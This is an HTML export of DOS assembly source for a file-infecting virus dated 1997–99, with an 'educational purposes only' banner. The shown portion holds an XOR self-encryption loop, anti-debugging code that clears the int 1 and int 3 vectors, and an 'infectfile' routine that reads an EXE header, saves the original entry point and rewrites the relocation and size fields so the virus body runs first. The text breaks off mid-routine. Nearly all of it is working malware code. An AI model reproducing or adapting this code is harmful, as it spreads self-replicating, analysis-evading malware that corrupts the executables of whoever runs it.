<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;--------------------------------------------</span><span class="sc0">
</span><span class="sc1">; Copyright AIDMan, 97-99 VSU</span><span class="sc0">
</span><span class="sc1">; This file is for educational purposes only</span><span class="sc0">
</span><span class="sc1">; if you are not agree please go away</span><span class="sc0">
</span><span class="sc1">;--------------------------------------------</span><span class="sc0">
</span><span class="sc5">filename</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">30</span><span class="sc0">
</span><span class="sc5">fileattr</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc0">
</span><span class="sc5">filedate</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc0">
</span><span class="sc5">filetime</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">22</span><span class="sc0">
</span><span class="sc5">filesize</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">1Ah</span><span class="sc0">
</span><span class="sc1">;---------------------------------</span><span class="sc0">
</span><span class="sc5">CODE</span><span class="sc0"> </span><span class="sc9">SEGMENT</span><span class="sc0"> </span><span class="sc12">'code'</span><span class="sc0">
</span><span class="sc9">ASSUME</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc0">
</span><span class="sc9">ORG</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">
</span><span class="sc5">MAIN</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc5">body</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc0">                    </span><span class="sc1">; BX = SS</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">                    </span><span class="sc1">; DX = SP</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">0fffeh</span><span class="sc0">
     </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">next</span><span class="sc0">
</span><span class="sc5">next</span><span class="sc4">:</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
     </span><span class="sc6">cld</span><span class="sc0">
     </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">
</span><span class="sc5">enc_val</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;--------------</span><span class="sc0">
</span><span class="sc5">Signature</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">PartPag</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Pagecnt</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ReloCnt</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">HdrSize</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">MinMem</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">MaxMem</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ReloSS</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ExeSP</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ChkSum</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ExeIP</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ReloCS</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;--------------</span><span class="sc0">
</span><span class="sc5">OldIP</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">OldCS</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">OldES</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">OldSS</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">OldSP</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">HiFSize</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">LoFSize</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">HiSize</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">LoSize</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------</span><span class="sc0">
</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">10Eh</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">OldSS</span><span class="sc4">]+</span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">              </span><span class="sc1">; BX = SS</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">OldSP</span><span class="sc4">]+</span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">              </span><span class="sc1">; DX = SP</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_pushDS</span><span class="sc0">                               </span><span class="sc1">; save DS, DS=CS</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">encrypt</span><span class="sc0">                               </span><span class="sc1">; encrypting procedure</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">virus</span><span class="sc0">
</span><span class="sc5">encrypt</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">enc_size</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">enc_val</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">vir_data</span><span class="sc0">
</span><span class="sc5">enc_loop</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">                      </span><span class="sc1">; AntiWeb BUG</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">60h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">1999h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">46h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">0Dh</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">stuff</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">enc_loop</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">stuff</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">20h</span><span class="sc0">
</span><span class="sc1">;--------------------------------------</span><span class="sc0">
</span><span class="sc5">int21h</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">addr21</span><span class="sc4">]+</span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">addr21</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;--------------------------------------</span><span class="sc0">
</span><span class="sc5">_pushDS</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">OldES</span><span class="sc4">]+</span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">                </span><span class="sc1">; save old ES</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">cli</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">                                          </span><span class="sc1">; stosw : ES:DI &lt;- AX</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">                                        </span><span class="sc1">; int 1</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">                                        </span><span class="sc1">; int 3</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">sti</span><span class="sc0">                                          </span><span class="sc1">; STUFF</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">oper3</span><span class="sc4">]+</span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">7182h</span><span class="sc0"> </span><span class="sc1">; FUNNY BUG = push cs,pop ds</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">oper3</span><span class="sc0">                       </span><span class="sc1">; for push cs,pop es = 8982h</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">oper3</span><span class="sc4">]+</span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">7182h</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">oper3</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">_saveDS</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;--------------------------------------</span><span class="sc0">
</span><span class="sc5">infectfile</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">18h</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Signature</span><span class="sc0">
           </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">int21h</span><span class="sc0">                    </span><span class="sc1">; read header of EXE</span><span class="sc0">
</span><span class="sc1">;           mov cx,0fff0h</span><span class="sc0">
</span><span class="sc1">;           cmp cx,word ptr [ReloCS]+bp    ; check is packed with PKLITE</span><span class="sc0">
</span><span class="sc1">;           jne @next3</span><span class="sc0">
</span><span class="sc1">;           ret</span><span class="sc0">
</span><span class="sc1">;           @next3:</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ExeIP</span><span class="sc4">]+</span><span class="sc8">bp</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OldIP</span><span class="sc4">]+</span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ReloCS</span><span class="sc4">]+</span><span class="sc8">bp</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OldCS</span><span class="sc4">]+</span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; save CS:IP</span><span class="sc0">

           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">handle</span><span class="sc4">]+</span><span class="sc8">bp</span><span class="sc0">
           </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
           </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">                   </span><span class="sc1">; seek the pointer to the end</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">int21h</span><span class="sc0">                    </span><span class="sc1">; DX:AX = new position</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">HiFSize</span><span class="sc4">]+</span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LoFSize</span><span class="sc4">]+</span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">   </span><span class="sc1">; Save File Length</span><span class="sc0">
           </span><span class="sc1">;-------------------------------</span><span class="sc0">
           </span><span class="sc1">; oldIP:=ExeIP                 ;</span><span class="sc0">
           </span><span class="sc1">; oldCS:=ReloCS                ;</span><span class="sc0">
           </span><span class="sc1">; ExeIP:=fsize mod 16          ;</span><span class="sc0">
           </span><span class="sc1">; ReloCS:=fsize div 16-HdrSize ;</span><span class="sc0">
           </span><span class="sc1">; fsize:=fsize+sizeof(exepsw)  ;</span><span class="sc0">
           </span><span class="sc1">; PageCnt:=fsize div 512+1     ;</span><span class="sc0">
           </span><span class="sc1">; PartPag:=fsize mod 512       ;</span><span class="sc0">
           </span><span class="sc1">;-------------------------------</span><span class="sc0">
           </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0fh</span><span class="sc0">
           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0adh</span><span class="sc0">                        </span><span class="sc1">; AX=LoDD,DX=HiDD</span><span class="sc0">
           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0d0h</span><span class="sc0">                        </span><span class="sc1">; CX=count bits</span><span class="sc0">
           </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">                      </span><span class="sc1">; returns : dd(DX,AX)</span><span class="sc0">
</span><span class="sc1">;----------------------------</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
           </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">HdrSize</span><span class="sc4">]+</span><span class="sc8">bp</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ReloCS</span><span class="sc4">]+</span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">    </span><span class="sc1">; Set ReloCS = fsize div 16</span><span class="sc0">
</span><span class="sc1">;----------------------------</span><span class="sc0">
           </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0fh</span><span class="sc0">
           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0a5h</span><span class="sc0">
           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0c2h</span><span class="sc0">
           </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc1">;----------------------------</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">HiSize</span><span class="sc4">]+</span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">    </span><span class="sc1">; DX = shl (shr 4)</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LoSize</span><span class="sc4">]+</span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">    </span><span class="sc1">; AX = shl (shr 4)</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">HiFSize</span><span class="sc4">]+</span><span class="sc8">bp</span><span class="sc0">   </span><span class="sc1">; DX = old fsize</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LoFSize</span><span class="sc4">]+</span><span class="sc8">bp</span><span class="sc0">   </span><span class="sc1">; AX = old fsize</span><span class="sc0">
           </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LoSize</span><span class="sc4">]+</span><span class="sc8">bp</span><span class="sc0">
           </span><span class="sc6">sbb</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">HiSize</span><span class="sc4">]+</span><span class="sc8">bp</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ExeIP</span><span class="sc4">]+</span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Set ExeIP</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
           </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">body</span><span class="sc4">)</span><span class="sc0">
           </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LoFSize</span><span class="sc4">]+</span><span class="sc8">bp</span><span class="sc0">
           </span><span class="sc6">adc</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">HiFSize</span><span class="sc4">]+</span><span class="sc8">bp</span><span class="sc0">   </span><span class="sc1">; DX:AX = new filesize</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">HiFSize</span><span class="sc4">]+</span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LoFSize</span><span class="sc4">]+</span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">
           </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0fh</span><span class="sc0">
           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0adh</span><span class="sc0">
           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0d0h</span><span class="sc0">
           </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc1">;---------------------------------------</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
           </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">PageCnt</span><span class="sc4">]+</span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">    </span><span class="sc1">; PageCnt = newfsize div 512+1</span><span class="sc0">
</span><span class="sc1">;---------------------------------------</span><span class="sc0">
           </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">
           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0fh</span><span class="sc0">
           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0a5h</span><span class="sc0">
           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0c2h</span><span class="sc0">
